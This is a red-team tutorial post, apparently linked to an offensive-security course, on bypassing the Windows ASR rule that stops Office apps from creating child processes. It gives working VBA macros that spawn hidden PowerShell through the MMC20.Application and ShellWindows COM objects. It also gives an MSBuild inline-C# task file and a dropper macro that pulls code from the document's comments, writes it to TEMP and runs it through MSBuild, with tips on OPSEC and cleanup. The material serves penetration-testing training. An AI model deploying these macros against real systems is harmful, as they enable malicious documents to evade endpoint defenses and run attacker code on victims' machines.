_"This rule blocks Office apps from creating child processes. This includes Word, Excel, PowerPoint, OneNote, and Access.**"**_

In the [Red Team Ops](https://training.zeropointsecurity.co.uk/courses/2) course, students create macro-enabled documents that spawn and run a PowerShell payload.  The VBA looks something like this:

```vb
Sub Exec()
    Dim wsh As Object
    Set wsh = CreateObject("WScript.Shell")
    wsh.Run "powershell"
    Set wsh = Nothing
End Sub
```

  

If we try and run this on WKSTN-2 which has this ASR rule enabled, we're blocked with a Windows Security alert.

  

![](https://rto2-assets.s3.eu-west-2.amazonaws.com/asr/block_child_processes.png)

  

## COM Bypass

One method to get around this is by using COM.  It's possible to instantiate COM objects directly from VBA, so we can look at leveraging those that we know result in code execution.

Not every COM object will do though - the **LocalServer32** key must be set so that the process will have a parent that is **not** the Office application.  For instance, the **MMC20.Application** object will use mmc.exe as the parent, and both the **ShellWindows** and **ShellBrowserWindow** ShellExecute methods will use explorer.exe as the parent.

Here's an example using MMC20.Application:

```vb
Sub Exec()
    Dim mmc As Object
    Set mmc = CreateObject("MMC20.Application")
    mmc.Document.ActiveView.ExecuteShellCommand "powershell", "", "", "7"
    Set mmc = Nothing
End Sub
```

  

mmc.exe will close straight away, thus leaving PowerShell spawned but without a parent.

  

![](https://rto2-assets.s3.eu-west-2.amazonaws.com/asr/powershell_mmc_child.png)

  
> Different versions of Windows seem to handle spawning MMC20.Application differently.  During my research I found that Windows 10 (tested using 21H1) will spawn mmc.exe as a child of the calling app (in this case Word/Excel/etc).  But on Windows Server 2019 (1809), mmc.exe spawns as a child of svchost.exe.

So the above VBA will bypass this ASR rule on something like a Terminal Services machine or a server delivering Office via Citrix, but not on a "standard" end-user Windows 10 machine.

And here's another example using ShellWindows:

```vb
Sub Exec()
    Dim com As Object
    Set com = GetObject("new:9BA05972-F6A8-11CF-A442-00A0C90A8F39")
    com.Item.Document.Application.ShellExecute "powershell", "", "", Null, 0
    Set com = Nothing
End Sub
```

  

This will not produce a visible PowerShell window, but it will be running as a child of explorer.exe.  This is probably the most OPSEC way to spawn PowerShell (as far as OPSEC and PowerShell goes).

  

![](https://rto2-assets.s3.eu-west-2.amazonaws.com/asr/powershell_explorer_child.png)

  

## LOLBAS

It also turns out that not all processes are blocked when this rule is enabled.  For instance, `WScript.Shell` can be used to start Notepad.

  

![](https://rto2-assets.s3.eu-west-2.amazonaws.com/asr/wscript_shell_notepad.png)

  

This suggests that the ASR rule is actually based on some sort of blacklist, so there may be scope to use command-line based execution.  An obvious place to look for these is the [LOLBAS project](https://lolbas-project.github.io/).  It only took me a few minutes to discover that **msbuild.exe** is not blocked, and there are probably loads more if you look deeper.

MSBuild can execute inline C# code from a `.xml` or `.csproj` file.  The MSBuild XML schema is documented [here](https://docs.microsoft.com/en-us/visualstudio/msbuild/msbuild-project-file-schema-reference).  Take the following example:

<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="MSBuild">
    <ASRSucks />
  </Target>
  <UsingTask
    TaskName="ASRSucks"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
    <Task>
      <Code Type="Class" Language="cs">
      <![CDATA[
        using System;
        using Microsoft.Build.Framework;
        using Microsoft.Build.Utilities;
        
        public class ASRSucks : Task, ITask
        {         
          public override bool Execute()
          {
              Console.WriteLine("Hello from C#!");
              return true;
          } 
        }     
      ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>

  

This can be executed like so:

```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe test.xml
```

  

![](https://rto2-assets.s3.eu-west-2.amazonaws.com/asr/msbuild.png)

  

The only requirement is that we drop this code to disk.  One strategy could be to save the code somewhere in the document (such as the comments), fetch it with the Macro, write to disk and execute.

  

![](https://rto2-assets.s3.eu-west-2.amazonaws.com/asr/word_comments.png)

  

```
Sub Exec()
    Dim comment As String
    Dim fSo As Object
    Dim dropper As Object
    Dim wsh As Object
    Dim temp As String
    Dim command As String
    
    temp = LCase(Environ("TEMP"))
    
    Set fSo = CreateObject("Scripting.FileSystemObject")
    Set dropper = fSo.CreateTextFile(temp & "\code.xml", True)
    
    comment = ActiveDocument.BuiltInDocumentProperties("Comments").Value
    
    dropper.WriteLine comment
    dropper.Close
    
    Set wsh = CreateObject("WScript.Shell")
    
    command = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe " & temp & "\code.xml"
    
    wsh.Run command
    
    Set fSo = Nothing
    Set dropper = Nothing
    Set wsh = Nothing
End Sub
```

> Remember that this drops the code to disk, so ensure you remove it afterwards.